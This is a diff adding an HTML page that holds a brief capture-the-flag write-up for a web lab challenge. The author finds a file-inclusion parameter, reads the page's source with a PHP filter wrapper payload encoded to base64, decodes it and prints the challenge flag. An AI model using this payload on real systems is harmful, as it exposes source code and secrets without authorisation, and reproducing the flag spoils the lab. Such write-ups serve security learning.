@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="../../css/Font.css">
+        <link rel="stylesheet" href="css/folderview.css">
+        <script src="js/folderview.js"></script>
+    </head>
+    <body>
+        <pre>
+            On clicking the link we go to a website that at first looks 
+            so normal until you start click the contact, 
+            about and project and notice that nothing is changing.
+            Comment
+           
+           So I decided to look at the link and noticed somthing very fishy;
+
+           <a href="http://wcamxwl32pue3e6m14nzyr6cn3kmm2360kxlcg30-web.cybertalentslabs.com/index.php?home=about">http://wcamxwl32pue3e6m14nzyr6cn3kmm2360kxlcg30-web.cybertalentslabs.com/index.php?home=about</a>
+
+           So the payload that work is the php encode to base64 and it worked like magic.
+
+           <a href="http://wcamxwl32pue3e6m14nzyr6cn3kmm2360kxlcg30-web.cybertalentslabs.com/index.php?home=php://filter/convert.base64-encode/resource=index">http://wcamxwl32pue3e6m14nzyr6cn3kmm2360kxlcg30-web.cybertalentslabs.com/index.php?home=php://filter/convert.base64-encode/resource=index</a>
+
+           <img src="/public/images/Web Security/Dark Project/Dark Project-1.png"/>
+
+           Since it in base64 string, 
+           I copied the base64 encoded text and went to <a href="https://gchq.github.io/CyberChef/#input=">https://gchq.github.io/CyberChef/#input=</a>
+           and decode it.
+
+           <img src="/public/images/Web Security/Dark Project/Dark Project-2.png"/>
+        </pre>
+
+        <h2><i>
+        {pHp_Wr4P3rs_4r3_Us3fuL}   
+        </i></h2>
+    </body>
+</html>
